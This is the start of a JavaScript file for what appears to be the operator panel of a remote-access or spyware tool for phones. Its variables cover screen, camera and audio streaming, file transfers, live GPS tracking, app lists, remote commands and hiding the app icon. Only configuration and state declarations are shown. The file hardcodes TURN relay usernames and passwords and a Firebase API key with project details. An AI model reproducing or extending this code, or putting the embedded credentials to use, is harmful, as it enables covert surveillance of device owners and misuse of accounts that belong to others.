// ==================== CONFIGURATION ====================
const CONFIG = {
    WS_URL: "wss://mirror-view.onrender.com",
    MAX_RECONNECT_DELAY: 30000,
    ICE_SERVERS: [
        { urls: "stun:stun.relay.metered.ca:80" },
        { urls: "turn:standard.relay.metered.ca:80", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turn:standard.relay.metered.ca:80?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turn:standard.relay.metered.ca:443", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turns:standard.relay.metered.ca:443?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" }
    ],
    FIREBASE_CONFIG: {
        apiKey: "AIzaSyCHjKvbe3ZIlCE6aN5euzEF2d-bt-u9ROc",
        authDomain: "webviewiot.firebaseapp.com",
        databaseURL: "https://webviewiot-default-rtdb.asia-southeast1.firebasedatabase.app",
        projectId: "webviewiot",
        storageBucket: "webviewiot.firebasestorage.app",
        messagingSenderId: "634777347775",
        appId: "1:634777347775:web:f8efc5bcdf19e3f1de880a",
        measurementId: "G-2KW4EJYTRB"
    }
};

// Firebase initialization
firebase.initializeApp(CONFIG.FIREBASE_CONFIG);
const auth = firebase.auth();
const db = firebase.firestore();

// Global variables
let currentUser = null;
let selectedDeviceId = null;
let ws = null;
let reconnectTimer = null;
let reconnectAttempts = 0;

// WebRTC variables
let screenPC = null;
let cameraPC = null;
let audioPC = null;
let fileTransfers = {};

// UI state
let mapInstance = null;
let currentData = [];
let currentPage = 0;
let dataType = null;
let currentPath = "root";
let selectedFiles = [];
let screenActive = false;
let iconHidden = false;
let flashOn = false;
let isLoginMode = true;
let liveGpsActive = false;
let mediaRecorder = null;
let recordedChunks = [];
let pendingCommand = null;
let newAlerts = [];
let appsData = [];
let screenMediaRecorder = null;
let screenRecordedChunks = [];

// DOM elements
const panel = document.getElementById('main-panel');
const statusEl = document.getElementById('status');
const wsDebug = document.getElementById('wsDebug');
const modalOverlay = document.getElementById('screenModalOverlay');
const modalVideo = document.getElementById('modalScreenVideo');
